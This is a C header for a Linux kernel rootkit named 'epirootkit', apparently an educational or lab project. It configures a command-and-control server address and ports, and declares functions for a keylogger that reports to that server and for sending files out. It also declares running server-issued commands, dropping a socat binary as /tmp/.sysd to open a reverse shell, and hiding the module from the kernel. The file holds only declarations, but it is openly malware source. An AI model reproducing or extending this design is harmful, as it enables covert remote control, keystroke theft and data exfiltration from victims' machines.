#ifndef EPIROOTKIT_H
#define EPIROOTKIT_H

#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// Utils macros
#define SUCCESS 0
#define FAILURE 1
#define SHA256_DIGEST_SIZE 32

// Logs macros
#define DEBUG 1
#define DBG_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_info(fmt, ##args); 							\
		} 													\
	} while (0)

#define ERR_MSG(fmt, args...) 								\
	do { 													\
		if (DEBUG) { 										\
			pr_err(fmt, ##args); 							\
		} 													\
	} while (0)

// Configuration macros
#define SERVER_IP "192.168.100.2"
#define SERVER_PORT 4242
#define REVERSE_SHELL_PORT 9001
#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
#define STDOUT_FILE "/tmp/std.out"
#define STDERR_FILE "/tmp/std.err"
#define SOCAT_BINARY_PATH "/tmp/.sysd"

#define MAX_MSG_SEND_OR_RECEIVE_ERROR 5
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 1024

// Used by exec_str_as_command 
// to store the return code of the command
struct exec_code_stds {
	int code;
	char *std_out;
	char *std_err;
};

struct command {
    char *cmd_name;
    unsigned cmd_name_size;
    char *cmd_desc;
    unsigned cmd_desc_size;
    int (*cmd_handler)(char *args);
};

// Module parameters
extern char *ip;
extern int port;
extern char *message;

// Global control variables
extern bool is_auth;										// Flag to indicate if the user is authenticated
extern bool restart_on_error;								// Flag to restart the thread on error or disconnection
extern struct socket *sock;									// Socket for network communication
extern struct exec_code_stds exec_result;					// Last execution result
extern struct task_struct *network_thread;					// Thread for network communication
extern bool thread_exited;									// Flag to indicate if the thread has exited

// Function prototypes

// exec_cmd.c
int init_exec_result(void);									// Initialize exec_result structure
int free_exec_result(void);									// Free exec_result structure
int exec_str_as_command(char *user_cmd, bool catch_stds);	// Execute a command string in user mode

// crypto.c
int encrypt_buffer(const char *in, size_t in_len, 			// Encrypt a buffer using AES
				char **out, size_t *out_len);
int decrypt_buffer(const char *in, size_t in_len, 			// Decrypt a buffer using AES
				char **out, size_t *out_len);
int hash_string(const char *input, u8 *digest);				// Hash a string using SHA-256
bool are_hash_equals(const u8 *h1, const u8 *h2);			// Compare two hashes
void hash_to_str(const u8 *digest, char *output);			// Convert a hash to a string representation

// network.c
int send_to_server(char *message, ...);						// Send a message to the server
int receive_from_server(char *buffer, size_t max_len);		// Wait for a message from the server
int send_file_to_server(char *filename);					// Send a file to the server
int network_worker(void *data);								// Kernel thread for network communication
int close_socket(void);										// Release the socket

// file_ops.c
char *read_file(char *filename, int *readed_size);			// Read the content of a file into a dynamically allocated buffer

// epikeylog.c
int epikeylog_init(int keylog_mode);						// Initialize the keylogger
int epikeylog_send_to_server(void);							// Send keylogger content to the server
int epikeylog_exit(void);									// Cleanup function for the keylogger

// socat.c
int drop_socat_binaire(void);								// Drop the socat binary in /tmp/.sysd
int remove_socat_binaire(void);								// Remove the socat binary from /tmp/.sysd
int launch_reverse_shell(char *args);						// Launch the reverse shell with socat

// rootkit_command.c
int rootkit_command(char *command, unsigned command_size);	// Handle commands received from the server

// hider.c
int hide_module(void);										// Hide the module from the kernel
int unhide_module(void);									// Unhide the module in the kernel

// fs.c
int create_hidden_tmp_dir(void);							// Create a hidden temporary directory
int remove_hidden_tmp_dir(void);							// Remove the hidden temporary directory

#endif // EPIROOTKIT_H
